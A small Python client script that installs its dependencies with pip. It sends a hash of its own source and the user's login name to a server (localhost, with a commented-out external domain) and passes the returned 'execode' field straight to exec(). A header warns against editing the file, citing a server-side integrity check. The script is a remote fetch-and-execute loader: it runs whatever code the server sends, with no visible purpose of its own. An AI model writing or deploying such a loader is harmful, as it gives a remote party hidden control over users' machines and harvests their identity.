# WARNING
# DO NOT TRY TO MODIFY THIS FILE.
# ANY MODIFICATION WILL NOT PASS THE SECURITY CHECK OF THE SERVER.

try:
    import requests
except ModuleNotFoundError:
    input("Module not found: requests. Press [Enter] to install or [CTRL+C] to abort.")
    print('Now trying to install requests...')
    import os
    os.system('pip3 install requests --user')

try:
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    input("Module not found: pycryptodome. Press [Enter] to install or [CTRL+C] to abort.")
    print('Now trying to install pycryptodome...')
    import os
    os.system('pip3 install pycryptodome --user')

from hashlib import md5
from hashlib import sha256
import requests
from Crypto.Cipher import AES
import base64
import os

clientver = '0.1'

def fetchFile():
    f = open(__file__,'rb')
    # r = requests.get('https://service.mcsrv.icu/ga/cs',{
    r = requests.get('http://localhost/ga/cs',{
        'token':base64.b64encode(md5(f.read()).digest()).decode(),
        'uuid':os.environ['username'].encode(),
        'clientver': clientver
    })

    f.close()

    if r.status_code==200:
        s = r.json()
        if s['code'] != 0:
            print('Request failed (',s['code'],s['errmsg'],')')
            return
        exec(s['execode'])
    else:
        print('Request failed (',r.status_code,')')
        return

fetchFile()